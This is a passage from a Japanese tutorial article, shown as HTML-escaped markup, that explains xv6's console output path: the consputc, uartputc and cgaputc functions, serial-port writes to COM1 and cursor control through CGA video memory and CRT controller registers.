  &lt;span class=&quot;token function&quot;&gt;releasesleep&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;ip&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;lock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;この関数についてはファイルシステムを扱う際に詳しく見ていきますが、受け渡しされた&lt;code class=&quot;language-text&quot;&gt;inode&lt;/code&gt;の持つ‘sleeplock‘構造体を操作してロックを解放しています。&lt;/p&gt;
&lt;p&gt;続いては&lt;code class=&quot;language-text&quot;&gt;acquire&lt;/code&gt;でロックを取得した後、&lt;code class=&quot;language-text&quot;&gt;consputc&lt;/code&gt;関数に受け渡しされた文字列を一文字ずつ流し込んでいます。&lt;/p&gt;
&lt;p&gt;この時、与えられた文字列は&lt;code class=&quot;language-text&quot;&gt;0xFF&lt;/code&gt;とのANDになるので、印字可能な状態が担保されます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;consputc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; c&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;panicked&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;cli&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;c &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; BACKSPACE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;uartputc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token char&quot;&gt;&apos;\b&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;uartputc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token char&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;uartputc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token char&quot;&gt;&apos;\b&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;token function&quot;&gt;uartputc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;cgaputc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ここで、与えられた値を引数として&lt;code class=&quot;language-text&quot;&gt;uartputc&lt;/code&gt;関数が呼び出されます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;uartputc&lt;/code&gt;関数は&lt;code class=&quot;language-text&quot;&gt;uart.c&lt;/code&gt;で定義された関数で、シリアルポート(UART)への空きこみを行います。&lt;/p&gt;
&lt;p&gt;ここでは、&lt;code class=&quot;language-text&quot;&gt;COM1(I/Oポート 0x3f8)&lt;/code&gt;に受け取った値を書き込んでいます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;uartputc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; c&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;uart&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;128&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;inb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;COM1&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;microdelay&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;COM1&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; c&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;COM1+0&lt;/code&gt;はデータレジスタになっており、ここに値が書き込まれると送信バッファに書き込みが行われます。&lt;/p&gt;
&lt;p&gt;その前の行の&lt;code class=&quot;language-text&quot;&gt;inb(COM1+5)&lt;/code&gt;はラインステータスレジスタの値の読み取りを行っています。&lt;/p&gt;
&lt;p&gt;ラインステータスレジスタの6番目のbitは&lt;code class=&quot;language-text&quot;&gt;THRE&lt;/code&gt;と呼ばれるレジスタで、このbitが立っているときは送信バッファが空で、新たなデータを送信可能であることを意味します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://wiki.osdev.org/Serial_Ports&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Serial Ports - OSDev Wiki&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;つまり&lt;code class=&quot;language-text&quot;&gt;!(inb(COM1+5) &amp;amp; 0x20)&lt;/code&gt;の行は、ラインステータスレジスタの&lt;code class=&quot;language-text&quot;&gt;THRE&lt;/code&gt;をチェックして、送信バッファが使用可能でない場合は&lt;code class=&quot;language-text&quot;&gt;microdelay&lt;/code&gt;関数により処理を遅延させる処理を行っているわけです。&lt;/p&gt;
&lt;p&gt;ちなみに、&lt;code class=&quot;language-text&quot;&gt;BACKSPACE&lt;/code&gt;が入力された場合の書き込みが&lt;code class=&quot;language-text&quot;&gt;uartputc(&apos;\b&apos;); uartputc(&apos; &apos;); uartputc(&apos;\b&apos;);&lt;/code&gt;になっているのは、カーソルを一つ戻してスペースで上書きした上で、もう一度書き込み前の位置にカーソルを戻しているイメージみたいです。&lt;/p&gt;
&lt;h3 id=&quot;ビデオメモリの書き込み&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%93%E3%83%87%E3%82%AA%E3%83%A1%E3%83%A2%E3%83%AA%E3%81%AE%E6%9B%B8%E3%81%8D%E8%BE%BC%E3%81%BF&quot; aria-label=&quot;ビデオメモリの書き込み permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ビデオメモリの書き込み&lt;/h3&gt;
&lt;p&gt;シリアルポートへの書き込みが完了したら、最後に&lt;code class=&quot;language-text&quot;&gt;cgaputc&lt;/code&gt;関数が呼び出されます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;cgaputc&lt;/code&gt;関数では、入力値をビデオメモリに書き込んで出力します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;cgaputc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; c&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; pos&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Cursor position: col + 80*row.&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;CRTPORT&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  pos &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;inb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;CRTPORT&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;CRTPORT&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  pos &lt;span class=&quot;token operator&quot;&gt;|=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;inb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;CRTPORT&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;c &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token char&quot;&gt;&apos;\n&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; pos &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; pos&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;c &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; BACKSPACE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pos &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;pos&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    crt&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;pos&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x0700&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// black on white&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pos &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; pos &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;pos under/overflow&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pos&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// Scroll up.&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;memmove&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;crt&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; crt&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;crt&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    pos &lt;span class=&quot;token operator&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;crt&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;pos&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;crt&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; pos&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;CRTPORT&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;CRTPORT&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; pos&lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;CRTPORT&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;CRTPORT&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; pos&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  crt&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;pos&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token char&quot;&gt;&apos; &apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x0700&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ここで使用している書き込み先の&lt;code class=&quot;language-text&quot;&gt;crt&lt;/code&gt;はアドレス&lt;code class=&quot;language-text&quot;&gt;0xb8000&lt;/code&gt;の領域です。&lt;/p&gt;
&lt;p&gt;この領域はフレームバッファと呼ばれる領域です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;//PAGEBREAK: 50&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;BACKSPACE&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x100&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;CRTPORT&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x3d4&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; ushort &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;crt &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ushort&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;P2V&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0xb8000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// CGA memory&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://e-words.jp/w/%E3%83%95%E3%83%AC%E3%83%BC%E3%83%A0%E3%83%90%E3%83%83%E3%83%95%E3%82%A1.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;フレームバッファ（frame buffer）とは - IT用語辞典 e-Words&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;http://www.jamesmolloy.co.uk/tutorial_html/3.-The%20Screen.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;3.-The Screen&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;まず&lt;code class=&quot;language-text&quot;&gt;CRTPORT&lt;/code&gt;ですが、これは&lt;code class=&quot;language-text&quot;&gt;CRT Controller&lt;/code&gt;のレジスタである&lt;code class=&quot;language-text&quot;&gt;0x3D4&lt;/code&gt;を指しています。&lt;/p&gt;
&lt;p&gt;これは制御用のレジスタで、&lt;code class=&quot;language-text&quot;&gt;0x3D4&lt;/code&gt;に対応するデータレジスタ領域は&lt;code class=&quot;language-text&quot;&gt;0x3D5&lt;/code&gt;となります。&lt;/p&gt;
&lt;p&gt;この2つの領域を利用してコンソール上のカーソル位置をコントロールできます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;0x3D4&lt;/code&gt;に14をセットすることで、16bitで表現されるカーソルの上位8bitを制御することを指定します。&lt;/p&gt;
&lt;p&gt;そして、15をセットした場合は、カーソルの下位8bitを制御することを指定します。&lt;/p&gt;
